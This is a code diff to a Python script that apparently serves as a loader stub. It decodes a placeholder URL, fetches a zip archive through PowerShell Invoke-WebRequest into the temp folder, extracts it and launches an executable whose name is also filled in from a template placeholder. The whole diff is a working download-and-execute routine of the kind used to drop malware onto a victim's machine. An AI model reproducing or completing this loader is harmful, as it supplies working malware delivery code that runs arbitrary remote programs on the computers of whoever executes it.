@@ -1,4 +1,3 @@
-import requests
 import base64
 import os
 import zipfile
@@ -7,7 +6,8 @@ import subprocess
 import tempfile
 from urllib.parse import unquote
 
-# TODO: add powershell downloading instead of requests
+destination = os.path.join(tempfile.gettempdir(), "Seoul.zip")
+
 def download_zip(url):
     try:
         padding = len(url) % 4
@@ -23,41 +23,42 @@ def download_zip(url):
             clean_url = 'http://' + clean_url
             
         print(f"[*] Downloading zip file...") 
-        r = requests.get(clean_url)
-        r.raise_for_status()
-        return r.content
-        
+        r = subprocess.run(['powershell', 'Invoke-WebRequest', '-Uri', clean_url, '-OutFile', destination])
+        r.check_returncode()
+        with open(destination, 'rb') as f:
+            return f.read()
     except Exception as e:
         print(f"[!] Download failed: {e}")
         return None
 
 
-def extract_and_run(zip_data):
+def extract_and_run(zip_data, executable_name):
     try:
         with tempfile.TemporaryDirectory() as tmpdir:
             print(f"[*] Extracting to {tmpdir}")
             with zipfile.ZipFile(io.BytesIO(zip_data)) as z:
                 z.extractall(tmpdir)
 
-            exe_path = os.path.join(tmpdir, "Game.exe")
+            exe_path = os.path.join(tmpdir, executable_name)
             if os.path.exists(exe_path):
                 print(f"[*] Running {exe_path}")
-                # Safer execution without shell=True
                 subprocess.Popen([exe_path], cwd=tmpdir)
             else:
-                print("[!] EXE not found in ZIP! Contents:")
-                print(os.listdir(tmpdir))
+                print(f"[!] {executable_name} not found in ZIP! Contents:")
+                for root, _, files in os.walk(tmpdir):
+                    for file in files:
+                        print(os.path.join(root, file))
     except Exception as e:
         print(f"[!] Extraction failed: {e}")
 
 
 def main():
     url = '_SEOUL_URL_'  
-    execuatable_name = "_SEOUL_EXE_" # working on it
-    
+    executable_name = "_SEOUL_EXE_" # working on it
+
     zip_data = download_zip(url)
     if zip_data:
-        extract_and_run(zip_data)
+        extract_and_run(zip_data, executable_name)
     else:
         print("[!] No ZIP data received")
 
